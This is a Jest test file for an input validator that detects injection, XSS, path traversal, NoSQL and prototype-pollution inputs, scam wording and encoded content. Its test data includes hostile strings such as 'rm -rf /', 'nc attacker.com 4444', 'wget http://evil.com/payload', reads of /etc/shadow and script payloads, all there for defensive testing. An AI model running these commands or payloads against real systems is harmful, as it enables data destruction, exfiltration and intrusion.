import { AdvancedInputValidator } from '../advanced-validation';

describe('AdvancedInputValidator', () => {
  describe('Basic Input Validation', () => {
    it('should validate normal text input', () => {
      const result = AdvancedInputValidator.validateInput('Hello world');
      
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
      expect(result.sanitized).toBe('Hello world');
    });

    it('should reject empty or invalid inputs', () => {
      const emptyResult = AdvancedInputValidator.validateInput('');
      expect(emptyResult.isValid).toBe(false);
      expect(emptyResult.errors[0]).toContain('non-empty string');

      const nullResult = AdvancedInputValidator.validateInput(null as any);
      expect(nullResult.isValid).toBe(false);
    });

    it('should enforce length limits', () => {
      const longInput = 'x'.repeat(100);
      const result = AdvancedInputValidator.validateInput(longInput, { maxLength: 50 });
      
      expect(result.isValid).toBe(false);
      expect(result.errors[0]).toContain('exceeds maximum length');
    });

    it('should detect null bytes', () => {
      const input = 'test\x00string';
      const result = AdvancedInputValidator.validateInput(input);
      
      expect(result.isValid).toBe(false);
      expect(result.errors[0]).toContain('null bytes');
    });

    it('should warn about control characters', () => {
      const input = 'test\x01\x02string';
      const result = AdvancedInputValidator.validateInput(input);
      
      expect(result.isValid).toBe(true); // Warnings don't make it invalid
      expect(result.warnings[0]).toContain('control characters');
    });
  });

  describe('Malicious Pattern Detection', () => {
    it('should detect SQL injection patterns', () => {
      const sqlInputs = [
        "'; DROP TABLE users; --",
        "1 OR 1=1",
        "UNION SELECT password FROM users",
        "admin'--",
        "1; WAITFOR DELAY '00:00:05'",
        "SELECT * FROM information_schema.tables",
        "INSERT INTO users VALUES ('hacker', 'password')",
        "UPDATE users SET password='hacked' WHERE id=1",
        "DELETE FROM users WHERE 1=1",
        "CREATE TABLE malicious (id INT)",
        "ALTER TABLE users ADD COLUMN hacked VARCHAR(255)",
        "EXEC xp_cmdshell 'dir'",
      ];
      
      sqlInputs.forEach(input => {
        const result = AdvancedInputValidator.validateInput(input);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => error.includes('malicious pattern'))).toBe(true);
      });
    });

    it('should detect XSS patterns', () => {
      const xssInputs = [
        '<script>alert("xss")</script>',
        'javascript:alert(1)',
        '<img onerror="alert(1)" src="x">',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<object data="javascript:alert(1)"></object>',
        '<embed src="javascript:alert(1)">',
        'expression(alert(1))',
        'vbscript:msgbox(1)',
        '<div onclick="alert(1)">Click me</div>',
        '<input onfocus="alert(1)" autofocus>',
      ];
      
      xssInputs.forEach(input => {
        const result = AdvancedInputValidator.validateInput(input);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => error.includes('malicious pattern'))).toBe(true);
      });
    });

    it('should detect command injection patterns', () => {
      const cmdInputs = [
        'test; rm -rf /',
        'test && cat /etc/passwd',
        'test | nc attacker.com 4444',
        'test `whoami`',
        'test $(id)',
        'test & ping google.com',
        'ls -la /etc',
        'cat /proc/version',
        'ps aux | grep root',
        'netstat -tulpn',
        'ifconfig eth0',
        'ping -c 1 127.0.0.1',
        'nslookup google.com',
        'dig @8.8.8.8 example.com',
        'curl http://malicious.com',
        'wget http://evil.com/payload',
      ];
      
      cmdInputs.forEach(input => {
        const result = AdvancedInputValidator.validateInput(input);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => error.includes('malicious pattern'))).toBe(true);
      });
    });

    it('should detect path traversal patterns', () => {
      const pathInputs = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        '/proc/self/environ',
        '/sys/class/net/eth0/address',
        'file:///etc/passwd',
        '....//....//etc/passwd',
      ];
      
      pathInputs.forEach(input => {
        const result = AdvancedInputValidator.validateInput(input);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => error.includes('malicious pattern'))).toBe(true);
      });
    });

    it('should detect LDAP injection patterns', () => {
      const ldapInputs = [
        'admin)(|(password=*))',
        'user*)(uid=*))(|(uid=*',
        '*)(&(objectClass=user)',
        'test)(cn=*))(&(cn=*',
      ];
      
      ldapInputs.forEach(input => {
        const result = AdvancedInputValidator.validateInput(input);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => error.includes('malicious pattern'))).toBe(true);
      });
    });

    it('should detect NoSQL injection patterns', () => {
      const nosqlInputs = [
        '{"$where": "this.password.match(/.*/)"}',
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$lt": "zzz"}',
        '{"$regex": ".*"}',
        '$where: function() { return true; }',
      ];
      
      nosqlInputs.forEach(input => {
        const result = AdvancedInputValidator.validateInput(input);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => error.includes('malicious pattern'))).toBe(true);
      });
    });
  });

  describe('Suspicious Pattern Detection', () => {
    it('should detect phishing indicators', () => {
      const phishingInputs = [
        'URGENT ACTION REQUIRED: Verify your account',
        'Your account has been suspended, click here immediately',
        'Limited time offer - act now!',
        'Congratulations! You have been selected as a winner',
        'Claim your prize now before it expires',
        'Verify your identity to prevent account lockout',
      ];
      
      phishingInputs.forEach(input => {
        const result = AdvancedInputValidator.validateInput(input);
        expect(result.warnings.length).toBeGreaterThan(0);
        expect(result.warnings.some(warning => warning.includes('Suspicious pattern'))).toBe(true);
      });
    });

    it('should detect cryptocurrency scam patterns', () => {
      const cryptoInputs = [
        'Send 1 Bitcoin to this address for guaranteed returns',
        'Share your wallet seed phrase for verification',
        'Exclusive investment opportunity in Ethereum',
        'Your crypto wallet private key is needed',
      ];
      
      cryptoInputs.forEach(input => {
        const result = AdvancedInputValidator.validateInput(input);
        expect(result.warnings.length).toBeGreaterThan(0);
      });
    });

    it('should detect donation scam patterns', () => {
      const donationInputs = [
        'Emergency fund needed for Israel defense',
        'Urgent donation required for IDF soldiers',
        'Help Ukraine now - donate immediately',
        'Support Israel emergency fund',
      ];
      
      donationInputs.forEach(input => {
        const result = AdvancedInputValidator.validateInput(input);
        expect(result.warnings.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Encoding Detection', () => {
    it('should detect Base64 encoding', () => {
      const base64Input = 'SGVsbG8gV29ybGQgdGhpcyBpcyBhIGxvbmcgYmFzZTY0IGVuY29kZWQgc3RyaW5nPQ=='; // Long base64
      const result = AdvancedInputValidator.validateInput(base64Input);
      
      expect(result.warnings.some(warning => warning.includes('Encoded content'))).toBe(true);
    });

    it('should detect hex encoding', () => {
      const hexInputs = [
        '0x48656c6c6f',
        '\\x48\\x65\\x6c\\x6c\\x6f',
        '%48%65%6c%6c%6f',
      ];
      
      hexInputs.forEach(input => {
        const result = AdvancedInputValidator.validateInput(input);
        expect(result.warnings.some(warning => warning.includes('Encoded content'))).toBe(true);
      });
    });

    it('should detect Unicode escapes', () => {
      const unicodeInput = '\\u0048\\u0065\\u006c\\u006c\\u006f';
      const result = AdvancedInputValidator.validateInput(unicodeInput);
      
      expect(result.warnings.some(warning => warning.includes('Encoded content'))).toBe(true);
    });

    it('should detect HTML entities', () => {
      const htmlEntityInputs = [
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
      ];
      
      htmlEntityInputs.forEach(input => {
        const result = AdvancedInputValidator.validateInput(input);
        expect(result.warnings.some(warning => warning.includes('Encoded content'))).toBe(true);
      });
    });
  });

  describe('Content Type Validation', () => {
    it('should warn about HTML when not allowed', () => {
      const htmlInput = '<div>Hello <b>World</b></div>';
      const result = AdvancedInputValidator.validateInput(htmlInput, { allowHTML: false });
      
      expect(result.isValid).toBe(true); // Warnings don't make it invalid
      expect(result.warnings.some(warning => warning.includes('HTML tags detected'))).toBe(true);
    });

    it('should allow HTML when explicitly allowed', () => {
      const htmlInput = '<div>Hello <b>World</b></div>';
      const result = AdvancedInputValidator.validateInput(htmlInput, { allowHTML: true });
      
      expect(result.isValid).toBe(true);
    });

    it('should warn about URLs when not allowed', () => {
      const urlInput = 'Check out https://example.com for more info';
      const result = AdvancedInputValidator.validateInput(urlInput, { allowURLs: false });
      
      expect(result.warnings.some(warning => warning.includes('URLs detected'))).toBe(true);
    });

    it('should warn about emails when not allowed', () => {
      const emailInput = 'Contact us at support@example.com';
      const result = AdvancedInputValidator.validateInput(emailInput, { allowEmails: false });
      
      expect(result.warnings.some(warning => warning.includes('Email addresses detected'))).toBe(true);
    });
  });

  describe('Custom Pattern Validation', () => {
    it('should validate against custom patterns', () => {
      const customPattern = /\b(secret|confidential|private)\b/i;
      const input = 'This is a secret document';
      
      const result = AdvancedInputValidator.validateInput(input, {
        customPatterns: [customPattern],
      });
      
      expect(result.warnings.some(warning => warning.includes('Custom pattern matched'))).toBe(true);
    });
  });

  describe('JSON Validation', () => {
    it('should validate proper JSON', () => {
      const validJson = '{"name": "test", "value": 123}';
      const result = AdvancedInputValidator.validateJSON(validJson);
      
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject invalid JSON', () => {
      const invalidJson = '{"name": "test", "value":}';
      const result = AdvancedInputValidator.validateJSON(invalidJson);
      
      expect(result.isValid).toBe(false);
      expect(result.errors[0]).toContain('Invalid JSON');
    });

    it('should detect prototype pollution attempts', () => {
      const maliciousJson = '{"__proto__": {"isAdmin": true}}';
      const result = AdvancedInputValidator.validateJSON(maliciousJson);
      
      expect(result.isValid).toBe(false);
      expect(result.errors[0]).toContain('prototype pollution');
    });

    it('should warn about deeply nested objects', () => {
      const deepObject = JSON.stringify({
        a: { b: { c: { d: { e: { f: { g: { h: { i: { j: { k: 'deep' } } } } } } } } } }
      });
      
      const result = AdvancedInputValidator.validateJSON(deepObject);
      
      expect(result.warnings.some(warning => warning.includes('nesting depth'))).toBe(true);
    });

    it('should warn about large arrays', () => {
      const largeArray = JSON.stringify({ data: new Array(1500).fill('item') });
      const result = AdvancedInputValidator.validateJSON(largeArray);
      
      expect(result.warnings.some(warning => warning.includes('Large array'))).toBe(true);
    });
  });

  describe('Input Sanitization', () => {
    it('should sanitize malicious input when validation passes', () => {
      const input = 'Hello <script>alert(1)</script> World';
      const result = AdvancedInputValidator.validateInput(input, {
        checkForMaliciousPatterns: false, // Disable to test sanitization
        allowHTML: false,
      });
      
      expect(result.isValid).toBe(true);
      expect(result.sanitized).toBe('Hello &lt;script&gt;alert(1)&lt;&#x2F;script&gt; World');
    });

    it('should normalize whitespace', () => {
      const input = '  Hello    World  \n\n  ';
      const result = AdvancedInputValidator.validateInput(input, {
        checkForMaliciousPatterns: false,
      });
      
      expect(result.sanitized).toBe('Hello World');
    });

    it('should preserve HTML when allowed', () => {
      const input = '<div>Hello <b>World</b></div>';
      const result = AdvancedInputValidator.validateInput(input, {
        allowHTML: true,
        checkForMaliciousPatterns: false,
      });
      
      expect(result.sanitized).toBe('<div>Hello <b>World</b></div>');
    });
  });
});